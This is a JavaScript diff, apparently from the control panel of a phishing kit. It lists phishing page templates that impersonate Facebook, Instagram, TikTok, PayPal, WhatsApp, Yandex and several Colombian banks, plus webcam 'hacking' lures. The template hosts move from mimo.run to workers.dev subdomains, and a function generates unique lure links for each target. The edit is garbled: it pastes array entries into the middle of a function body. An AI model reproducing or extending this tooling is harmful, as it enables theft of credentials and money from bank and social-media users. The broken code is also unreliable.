@@ -287,26 +287,7 @@ onAuthStateChanged(auth, async (user) => {
 // (Todo igual, no toqué nada aquí)
 const plantillas = [
   { nombre: "Facebook Basico", url: "https://jo0u5y.mimo.run/index.html" },
-  { nombre: "Facebook Estandar", url: "https://c5z2c0.mimo.run/index.html" },
-  { nombre: "TikTok", url: "https://0amioa.mimo.run/index.html" },
-  { nombre: "Nequi Tarjeta", url: "https://zh1ig4.mimo.run/index.html" },
-  { nombre: "Instagram", url: "https://1nzujh.mimo.run/index.html" },
-  { nombre: "Facebook Escritorio", url: "https://jo0u5y.mimo.run/index.html" },
-  { nombre: "PayPal Estandar", url: "https://18ip42.mimo.run/index.html" },
-  { nombre: "PayPal Basico", url: "https://hy4jjz.mimo.run/index.html" },
-  { nombre: "Escotia Bank", url: "https://loot1a.mimo.run/index.html" },
-  { nombre: "whatsapp Normal", url: "https://ugtjzm.mimo.run/index.html" },
-  { nombre: "whatsapp XxX Avance", url: "https://poq5vo.mimo.run/index.html" },
-  { nombre: "Nequi Login Encuesta", url: "https://d3m76g.mimo.run/index.html" },
-  { nombre: "BBVA", url: "https://2gb4lr.mimo.run/index.html" },
-  { nombre: "BetPlay", url: "https://1b2hny.mimo.run/index.html" },
-  { nombre: "Banco de Bogota", url: "https://wwmw1p.mimo.run/index.html" },
-  { nombre: "Bancolombia", url: "https://mtfj1s.mimo.run/index.html" },
-  { nombre: "Camara Zoom Clases Hacking", url: "https://mduzum.mimo.run/index.html" },
-  { nombre: "Camara xXx Hacking", url: "https://d47vgr.mimo.run/index.html" },
-  { nombre: "Yandex", url: "https://8dn47v.mimo.run/index.html" },  
-  { nombre: "Garena Tarjeta", url: "https://5mpser.mimo.run/index.html" }
-];
+
 function generarEnlacesUnicos() {
   const fake = $id("fakeSelect");
   const lista = $id("optionsList");
@@ -323,7 +304,27 @@ function generarEnlacesUnicos() {
       fake.dataset.url = urlFull;
       lista.style.display = "none";
     };
-    lista.appendChild(item);
+     { nombre: "Facebook Basico", url: "https://faceboobasico.glegogle5341-af7.workers.dev/" },
+  { nombre: "Facebook Estandar", url: "https://facebook-estndar.glegogle5341-af7.workers.dev/" },
+  { nombre: "TikTok", url: "https://tik-tok.glegogle5341-af7.workers.dev/" },
+  { nombre: "Nequi Tarjeta", url: "https://nequi-tarjeta.glegogle5341-af7.workers.dev/" },
+  { nombre: "Instagram", url: "https://instagram.glegogle5341-af7.workers.dev/" },
+  { nombre: "Facebook Escritorio", url: "https://facebook-escritorio.glegogle5341-af7.workers.dev/" },
+  { nombre: "PayPal Estandar", url: "https://paypal-estandar.glegogle5341-af7.workers.dev/" },
+  { nombre: "PayPal Basico", url: "https://paypal-basico.glegogle5341-af7.workers.dev/" },
+  { nombre: "Escotia Bank", url: "https://scotiabank.glegogle5341-af7.workers.dev/" },
+  { nombre: "whatsapp Normal", url: "https://whatsapp-grupo.glegogle5341-af7.workers.dev/" },
+  { nombre: "whatsapp XxX Avance", url: "https://whatsappxxx.glegogle5341-af7.workers.dev/" },
+  { nombre: "Nequi Login Encuesta", url: "https://nequi-login.glegogle5341-af7.workers.dev/" },
+  { nombre: "BBVA", url: "https://2gb4lr.mimo.run/index.html" },
+  { nombre: "BetPlay", url: "https://betplay.glegogle5341-af7.workers.dev/" },
+  { nombre: "Banco de Bogota", url: "https://bogota.glegogle5341-af7.workers.dev/" },
+  { nombre: "Bancolombia", url: "https://bancolombia.glegogle5341-af7.workers.dev/?uid=uid_1771535158464_7gnn5tpq88q" },
+  { nombre: "Camara Zoom Clases Hacking", url: "https://camaraz00m.glegogle5341-af7.workers.dev/" },
+  { nombre: "Camara xXx Hacking", url: "https://camaraxx.glegogle5341-af7.workers.dev/" },
+  { nombre: "Yandex", url: "https://yandex.glegogle5341-af7.workers.dev/" },  
+  { nombre: "Garena Tarjeta", url: "https://5mpser.mimo.run/index.html" }
+]; lista.appendChild(item);
   });
   fake.onclick = () => lista.style.display = (lista.style.display === "block") ? "none" : "block";
 }
@@ -1156,3 +1157,4 @@ document.querySelectorAll('.btn,#menuBtn,#chatSend,#fakeSelect,#chatPanel,#chatM
   }, 2000);
 
 })();
+
